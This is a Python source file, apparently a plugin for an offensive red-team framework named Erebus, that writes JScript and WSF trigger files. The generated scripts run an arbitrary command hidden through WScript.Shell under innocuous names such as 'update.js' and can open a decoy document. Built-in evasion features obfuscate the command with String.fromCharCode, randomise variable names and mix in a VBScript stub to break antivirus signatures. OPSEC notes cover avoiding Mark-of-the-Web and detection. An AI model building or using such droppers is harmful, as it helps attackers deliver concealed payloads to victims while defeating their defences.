"""
Erebus Plugin - JScript / WSF Trigger
Author: Whispergate
Description: Creates .js (JScript) and .wsf (Windows Script File) trigger files.

Execution paths:
  .js   → wscript.exe target.js  (double-click in Explorer)
          cscript.exe target.js  (console mode, used in BAT chain)
  .wsf  → wscript.exe target.wsf - supports mixed VBScript + JScript in one file.
          Useful for splitting detection signatures across language boundaries.

Both formats use ActiveXObject("WScript.Shell") for command execution.
The WSF format wraps the JScript in XML job/script tags which breaks
many simple string-based AV signatures.
"""

import pathlib
import random
import string
from typing import Dict, Callable, Optional, Literal

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class JScriptTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating JScript (.js) and Windows Script File (.wsf) triggers.

    JScript executes with wscript.exe or cscript.exe - both are signed Windows
    binaries with established LOLBin status. The WSF format adds an XML envelope
    that defeats many static signature patterns while using identical runtime behavior.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="jscript_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates JScript (.js) and WSF (.wsf) triggers via wscript.exe / cscript.exe",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_jscript_trigger": self.create_jscript_trigger,
            "create_wsf_trigger": self.create_wsf_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        print("[Plugin] JScript Trigger plugin loaded - Supporting .js and .wsf delivery")

    # ================================================================
    # Helpers
    # ================================================================

    @staticmethod
    def _rand_id(n: int = 6) -> str:
        return "".join(random.choices(string.ascii_lowercase, k=n))

    @staticmethod
    def _jitter_string(s: str) -> str:
        """
        Split a string literal into concatenated char codes to defeat
        static string matching on the command value.
        Example: "cmd" → String.fromCharCode(99,109,100)
        """
        codes = ",".join(str(ord(c)) for c in s)
        return f"String.fromCharCode({codes})"

    # ================================================================
    # Plugin Functions
    # ================================================================

    def create_jscript_trigger(
        self,
        command: str,
        output_filename: str = "update.js",
        payload_dir: Optional[pathlib.Path] = None,
        # [MALLEABLE] obfuscate command via fromCharCode splitting
        obfuscate_command: bool = True,
        # [MALLEABLE] window style: 0=hidden, 1=normal, 7=minimised
        window_style: int = 0,
        # [MALLEABLE] wait for process to exit before script exits
        wait_on_return: bool = False,
        decoy_path: str = "",
    ) -> pathlib.Path:
        """
        Create a JScript (.js) trigger file executed by wscript.exe.

        Args:
            command:            Shell command to run via WScript.Shell.Run.
            output_filename:    Output .js filename.
            payload_dir:        Directory to write the script into.
            obfuscate_command:  If True, split command into String.fromCharCode()
                                to defeat static string scanning.
            window_style:       Window style for spawned process (0=hidden).
            wait_on_return:     If True, script blocks until process exits.
            decoy_path:         Optional path to a decoy document to open.

        Returns:
            pathlib.Path: Path to the created .js file.

        ## OPSEC Notes
        Detection Surface:
          - wscript.exe is a well-known LOLBin; any child process spawned from it
            generates Sysmon Event 1 with wscript.exe as ParentImage
          - JScript is AMSI-scanned on Win10+ via AMSI integration in jscript9.dll
          - Script content may be logged by ScriptBlock logging if PS is parent
        Behavioral Indicators:
          - wscript.exe spawning cmd.exe / powershell.exe
          - Short-lived wscript.exe with no .js file on disk (if run from container)
        Hardening:
          - [MALLEABLE] Use Shell.Application COM object instead of WScript.Shell
            to change process parent (ShellExecute vs CreateProcess lineage)
          - [MALLEABLE] Use obfuscate_command=True (default) to break string sigs
          - Combine with ISO/VHD: no MOTW, wscript.exe run from virtual disk path
        Evasion Maturity: Level 2 (Moderate) - wscript LOLBin well-known;
          AMSI hooks jscript9.dll on Win10+.
        """
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        # Variable names randomised per-build
        v_shell = self._rand_id()
        v_cmd   = self._rand_id()
        v_wait  = "true" if wait_on_return else "false"

        if obfuscate_command:
            cmd_expr = self._jitter_string(command)
        else:
            escaped = command.replace("\\", "\\\\").replace('"', '\\"')
            cmd_expr = f'"{escaped}"'

        decoy_block = ""
        if decoy_path:
            if obfuscate_command:
                decoy_expr = self._jitter_string(decoy_path)
            else:
                escaped_d = decoy_path.replace("\\", "\\\\").replace('"', '\\"')
                decoy_expr = f'"{escaped_d}"'
            decoy_block = f"\n{v_shell}.Run({decoy_expr}, 1, false);"

        script = f"""var {v_shell} = new ActiveXObject("WScript.Shell");
var {v_cmd} = {cmd_expr};
{v_shell}.Run({v_cmd}, {window_style}, {v_wait});{decoy_block}
"""
        output_path = payload_dir / output_filename
        output_path.write_text(script, encoding="utf-8")
        return output_path

    def create_wsf_trigger(
        self,
        command: str,
        output_filename: str = "update.wsf",
        payload_dir: Optional[pathlib.Path] = None,
        obfuscate_command: bool = True,
        window_style: int = 0,
        wait_on_return: bool = False,
        decoy_path: str = "",
        # [MALLEABLE] Mix a VBScript stub into the WSF to fragment signatures
        include_vbs_stub: bool = True,
    ) -> pathlib.Path:
        """
        Create a Windows Script File (.wsf) trigger with JScript payload.

        WSF wraps scripts in an XML job/script envelope. The XML structure
        breaks many AV string matchers that look for raw JScript patterns.
        Optionally adds a harmless VBScript stub block to further fragment
        any single-language detection rules.

        Args:
            command:            Shell command to run.
            output_filename:    Output .wsf filename.
            payload_dir:        Directory to write the script into.
            obfuscate_command:  If True, use String.fromCharCode() obfuscation.
            window_style:       Spawned process window style (0=hidden).
            wait_on_return:     Block until spawned process exits.
            decoy_path:         Optional decoy document to open.
            include_vbs_stub:   Add a no-op VBScript block to the WSF to split
                                detection signatures across script languages.

        Returns:
            pathlib.Path: Path to the created .wsf file.
        """
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        v_shell = self._rand_id()
        v_cmd   = self._rand_id()
        v_wait  = "true" if wait_on_return else "false"

        if obfuscate_command:
            cmd_expr = self._jitter_string(command)
        else:
            escaped = command.replace("\\", "\\\\").replace('"', '\\"')
            cmd_expr = f'"{escaped}"'

        decoy_block = ""
        if decoy_path:
            if obfuscate_command:
                decoy_expr = self._jitter_string(decoy_path)
            else:
                escaped_d = decoy_path.replace("\\", "\\\\").replace('"', '\\"')
                decoy_expr = f'"{escaped_d}"'
            decoy_block = f"\n{v_shell}.Run({decoy_expr}, 1, false);"

        js_block = f"""var {v_shell} = new ActiveXObject("WScript.Shell");
var {v_cmd} = {cmd_expr};
{v_shell}.Run({v_cmd}, {window_style}, {v_wait});{decoy_block}"""

        # [MALLEABLE] VBScript stub - no-op, just sets a variable
        vbs_stub = ""
        if include_vbs_stub:
            vbs_var = self._rand_id()
            vbs_stub = f"""
  <script language="VBScript">
    Dim {vbs_var}
    {vbs_var} = Now()
  </script>"""

        wsf = f"""<?xml version="1.0"?>
<job id="{self._rand_id()}">
  <script language="JScript">
    {js_block}
  </script>{vbs_stub}
</job>"""

        output_path = payload_dir / output_filename
        output_path.write_text(wsf, encoding="utf-8")
        return output_path


# Module-level instance for plugin auto-discovery
_plugin = JScriptTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
